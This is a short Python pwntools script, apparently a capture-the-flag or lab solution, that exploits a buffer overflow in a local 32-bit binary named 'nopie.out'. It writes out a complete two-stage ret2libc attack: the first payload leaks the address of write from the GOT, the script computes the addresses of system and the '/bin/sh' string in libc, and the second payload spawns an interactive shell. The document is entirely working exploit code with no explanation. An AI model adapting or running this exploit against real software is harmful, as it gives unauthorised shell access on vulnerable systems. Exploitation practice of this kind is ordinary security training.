from pwn import *

prg = process("./nopie.out")
nopie = ELF("./nopie.out")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
vuln_func = nopie.symbols["vuln_func"]


payload = b'A' * 140 + p32(nopie.symbols["write"]) + p32(vuln_func) + p32(1) + p32(nopie.got["write"]) + p32(4)
prg.send(payload)
write_addr = u32(prg.recv(4))
system_addr = write_addr - libc.symbols["write"] + libc.symbols["system"]
binsh_addr = write_addr - libc.symbols["write"] + next(libc.search(b"/bin/sh"))

payload = b'A' * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)
prg.send(payload)
prg.interactive()
